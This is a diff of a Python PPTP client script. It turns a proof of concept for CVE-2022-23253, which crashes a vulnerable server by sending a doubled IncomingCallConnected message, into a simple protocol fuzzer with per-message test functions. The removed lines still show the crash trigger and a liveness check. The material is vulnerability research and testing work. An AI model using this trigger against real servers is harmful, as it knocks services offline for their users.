@@ -71,52 +71,92 @@ def startControlSession():
     initializeCtlResponse = StartControlConnectionReply(packetBytes=StartControlReply_raw)
 
     if initializeCtlResponse.ErrorCode != 0 or initializeCtlResponse.ResultCode != 1:
-        raise ValueError("[:(] PoC Failed unexpectadly due to server side error, investigation reqiured....")
-    
+        raise ValueError("startControlSession error")
     return pocClient
 
-def poke_server():
-
-    try:
-        print("[+] Pokeing the target....")
-        poke_client = CtlClient(TEST_SERVER)
-        poke_client.CtlConnect(timeout=1)
-        print("[-] Its alive!?")
+def stopControlSession(client : CtlClient):
+    initializeCtlConnection = StopControlConnectionRequest()
+    client.CtlSendMsg(initializeCtlConnection)
+    StopControlReply_raw = client.CtlRecvMsg()
+    initializeCtlResponse = StopControlConnectionReply(packetBytes=StopControlReply_raw)
+    if initializeCtlResponse.ErrorCode != 0 or initializeCtlResponse.ResultCode != 1:
+        raise ValueError("stopControlSession error")
     
-    except Exception as e:
-        print("[+] Yep, its dead")
-
-
-def trigger_cve_2022_23253():
-    print("[+] Starting PPTP control connection")
+def echoTest(client : CtlClient):
+    EchoRequestMsg = EchoRequest()
+    client.CtlSendMsg(EchoRequestMsg)
+    EchoReply_raw = client.CtlRecvMsg()
+    EchoResponse = EchoReply(packetBytes=EchoReply_raw)
+    if EchoResponse.ErrorCode != 0 or EchoResponse.ResultCode != 1:
+        raise ValueError("echoTest error")
     
-    pocClient = startControlSession()
+def OutgoingCallTest(client : CtlClient):
+    newOutgoingCallRequest = OutgoingCallRequest()
+    client.CtlSendMsg(newOutgoingCallRequest)
+    OutgoingCallReply_raw = client.CtlRecvMsg()
+    newOutgoingCallReply = OutgoingCallReply(packetBytes=OutgoingCallReply_raw)
+    if newOutgoingCallReply.ResultCode != 1 or newOutgoingCallReply.ErrorCode != 0:
+        raise ValueError("OutgoingCallTest error ")
+
+def IncomingCallTest(client : CtlClient):
     newCallId = secrets.randbelow(0x10000)
     newCallSerial = secrets.randbelow(0x10000)
-    newIncomingCall = IncomingCallRequest(CallId=newCallId,CallSerialNumber=newCallSerial) #Requests Causing Issues
-    print("[+] Creating new incoming call")
-    pocClient.CtlSendMsg(newIncomingCall)
+    newIncomingCallRequest = IncomingCallRequest(CallId=newCallId, CallSerialNumber=newCallSerial)
+    client.CtlSendMsg(newIncomingCallRequest)
+    IncomingCallReply_raw = client.CtlRecvMsg()
+    newIncomingCallReply = IncomingCallReply(packetBytes=IncomingCallReply_raw)
     
-    ICReply_raw = pocClient.CtlRecvMsg()
-    newIncomingCallReply = IncomingCallReply(packetBytes=ICReply_raw)
-    print("[+] Incoming call reply received with call ID {}".format(newIncomingCallReply.CallId))
     if newIncomingCallReply.ResultCode != 1 or newIncomingCallReply.ErrorCode != 0:
-        raise ValueError("[:(] PoC failed unexpecadle due to server side error... ")
+        raise ValueError("newIncomingCallRequest/Reply error ")
 
     newIncomingCallConnected = IncomingCallConnected(newIncomingCallReply.CallId, 64, newIncomingCallReply.PacketRecvWindowSize, newIncomingCallReply.PacketTransitDelay)
-    print("[+] Triggering Bug!")
-    pocClient.CtlSendMsg(newIncomingCallConnected)
-    pocClient.CtlSendMsg(newIncomingCallConnected)
+    client.CtlSendMsg(newIncomingCallConnected)
 
-    print("[+] Machine should be dead now, lets check!")
-    poke_server()
+def CallClearRequestTest(client : CtlClient):
+    newCallClearRequest = CallClearRequest()
+    client.CtlSendMsg(newCallClearRequest)
+
+def CallDisconnectNotifyTest(client : CtlClient):
+    newCallDisconnectNotify = CallDisconnectNotify()
+    client.CtlSendMsg(newCallDisconnectNotify)
+
+def WANErrorNotifyTest(client : CtlClient):
+    newWANErrorNotify = WANErrorNotify()
+    client.CtlSendMsg(newWANErrorNotify)
+
+def SetLinkInfoTest(client : CtlClient):
+    newSetLinkInfo = SetLinkInfo()
+    client.CtlSendMsg(newSetLinkInfo)
+
+
+# def poke_server():
+
+#     try:
+#         print("[+] Pokeing the target....")
+#         poke_client = CtlClient(TEST_SERVER)
+#         poke_client.CtlConnect(timeout=1)
+#         print("[-] Its alive!?")
+    
+#     except Exception as e:
+#         print("[+] Yep, its dead")
+
+
+def test():
+    client = startControlSession()
+    # echoTest(client)
+    # OutgoingCallTest(client)
+    # IncomingCallTest(client)
+    # CallClearRequestTest(client) # 진입 X, PNS to PAC
+    # CallDisconnectNotifyTest(client) # CtlpEngine의 분기까지 진입하나 CallEventCallDisconnectNotify 함수 진입 불가
+    # WANErrorNotifyTest(client) # CtlpEngine 분기까지 진입
+    # SetLinkInfoTest(client) # 진입 X, PNS to PAC
+    stopControlSession(client)
 
 def main():
-    
     global TEST_SERVER
     global CTL_PORT
 
-    parser = argparse.ArgumentParser(description="PoC for CVE-2022-23253!")
+    parser = argparse.ArgumentParser(description="this is simple PPTP_Fuzzer")
     parser.add_argument('--ip', type=str,required=True,dest="ip_address",help="IP address of the target server")
     parser.add_argument('--port', type=int, default=CTL_PORT,dest="ctl_port", help="Port of the PPTP CTL TCP socket, should remain as {} in most cases.".format(CTL_PORT))
 
@@ -125,11 +165,10 @@ def main():
     TEST_SERVER = args.ip_address
     CTL_PORT = args.ctl_port
 
-    continue_to_trigger = input("[?] This PoC will crash a vulnerable server, do you want to continue [y/n]: ")
+    continue_to_trigger = input("[?] Start Test? [y/n]: ")
 
     if continue_to_trigger.lower() == "y":
-        print("[+] Triggering Bug!")
-        trigger_cve_2022_23253()
+        test()
     else:
         print("[+] GoodBye!")
 
